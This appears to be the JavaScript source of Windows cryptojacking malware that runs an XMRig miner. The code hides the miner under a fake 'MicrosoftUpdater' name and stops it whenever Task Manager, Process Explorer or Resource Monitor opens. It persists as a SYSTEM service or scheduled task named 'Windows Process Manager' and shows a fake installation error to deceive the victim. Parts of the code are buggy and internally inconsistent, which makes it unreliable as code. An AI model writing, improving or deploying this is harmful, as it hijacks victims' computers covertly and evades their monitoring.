// THINK TWICE BEFORE RUNNING THIS CODE! YOU HAVE BEEN WARNED.

// needed libraries for information collection in XMRig

const Win = require('windows-interact');
const si = require('systeminformation');
const  minerStartHashMD5 = '1d26869f8a637d353eae2e65724d6b0b';

// File path of the miner

let currentMinerPath;

// Win-interact preferences

Win.set.preferences({
    TTSVoice: 'Microsoft David Desktop',
    appManagerRefreshInterval: 2500,
    log: {
        outputFile: null,
        showTime: false,
        verbose: {
            requestTo: null,
            PowerShell: false,
            appManager: false
        }
    }
});

Win.appManager.register({
    'TaskManager': {
        path: Win.path`C:\Windows\system32\Taskmgr.exe`,
    },
    'ResourceMonitor': {
        path: Win.path`C:\Windows\system32\resmon.exe`,
    },
});

// Main loop of the malware that checks if monitoring applications are running

async function main() {
    while (true) {
        // Check if Task Manager, Process Explorer, or Resource Monitor are running and kill the miner accordingly
        const taskManagerIsRunning = Win.process.isRunning('TaskManager');
        const processExplorerIsRunning = checkIfProcessExplorerIsRunning(); // Boolean
        const resourceMonitorIsRunning = Win.process.isRunning('ResourceMonitor');
        if ((taskManagerIsRunning || processExplorerIsRunning || resourceMonitorIsRunning) && (checkIfAlreadyRunning('MicrosoftUpdater') == true)) {
        // If Task Manager, Process Explorer, or Resource Monitor is running, and the malware is running as well, kill it
        killMiner();
    }
        if ((!taskManagerIsRunning && !processExplorerIsRunning && !resourceMonitorIsRunning && checkIfAlreadyRunning('MicrosoftUpdater')) == false) {
        // As long as neither TaskMgr, ProcExp, or ResMon is running and the malware is not already running, start it
        runMiner();
    }
        wait(2000);
    }
}

// Checks if a process is already running to prevent multi-execution

async function checkIfAlreadyRunning(process) {
    const systemProcesses = Win.cmd('tasklist');
    const indexedProcesses = systemProcesses.split('\n');
    for (let i = 0; i < indexedProcesses.length; i++) {
        if (indexedProcesses == process) {
            console.log(`${process} is running.`);
            return true;
        } else {
            console.log(`${process} is not running.`);
            return false;
        }
    }
}

async function checkIfProcessExplorerIsRunning() {
    const systemProcesses = Win.cmd('tasklist');
    const indexedProcesses = systemProcesses.split('\n');
    const processExplorerAliases = ['procexp.exe', 'procexp64.exe', 'procexp64a.exe'];
    for (const line of lines) {
        for (const name of processExplorerAliases) {
            if (line.toLowerCase().includes(name))
                return true;
                break;
        }
    }
}

function killMiner() {
    try {
        Win.cmd(`TASKKILL /f /IM ${minerPath}`);
    } catch {
        Win.cmd(`TASKKILL /f /IM MicrosoftUpdater.exe`);
    }
}

function wait(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function runMiner() {
    Win.cmd(currentMinerPath); 
}

async function getMinerLaunchPath() {
    Win.cmd(`where /r C:\ start.cmd`, function(stdout) {
        const whereIsLines = stdout.split('\n'); // List
        for (let lines = 0; lines < whereIsLines.length; lines++) {
            startCMDHash = Win.cmd(`certutil -hashfile ${whereIsLines} MD5`);
            if (startCMDHash = minerStartHashMD5) {
                currentMinerPath = whereIsLines[lines];
                return currentMinerPath;
            }
        }
    }, {suppressErrors: true});
}

async function autorunMethods() {
    try {
        registerMinerAsService(); 
        /* Running the miner as a system service is preferred because the average user
           is less likely to go looking for one */
    } catch {
        addToWinTaskScheduler(); 
        /* If service registration with sc fails for some reason, autorunning in Task Scheduler
           is a valid but less preferred option */
    } 
}

async function addToWinTaskScheduler() { // Adds start.cmd to Windows Task Scheduler under the SYSTEM user
    Win.cmd('schtasks /create /sc onstart /tn "Windows Process Manager" /tr start.cmd /ru SYSTEM');
}

async function registerMinerAsService() {
    Win.cmd('sc create Windows Process Manager binPath= start.cmd start= auto');
    wait(1000);
    Win.cmd('net start Windows Process Manager');
}

async function fakeInstall() {
    try {
        Win.showDesktop();
        await Win.alert('The volume does not contain a recognized file system. Please make sure that all required file system drivers are loaded and that the volume is not corrupted. Error code: 0x3ED.', 'Installation failed');
    } catch {
        console.log("An error occured");
    } finally {
        runMiner();
    }
}

async function checkForHardwareSupport() {
    try {
        const cpu = await si.cpu();
        const os = await si.osInfo();
        const mem = await si.mem(); // in bytes!
        const system = await si.system(); // used for checking if it's a virtual machine

        if (cpu.cores < 2 || mem.total < 4000000000) {
            await Win.alert('Insufficient system resources to continue.', 'Problem encountered');
            process.exit();
        }
        switch (os) {
            case "MacOS":
                await Win.alert('MacOS is not supported. Windows 10/11 only.', 'Unsupported operating system');
                process.exit();
            case "Linux":
                await Win.alert('Linux is not supported. Windows 10/11 only.', 'Unsupported operating system');
                process.exit();
            default:
                break;
        }
        if (system.virtual == true) {
            await Win.alert('You are running this in a virtual machine.', 'Virtual machine detected');
        }
    } catch {
        process.exit();
    } finally {
        await fakeInstall();
    }
}

checkForHardwareSupport();
main();
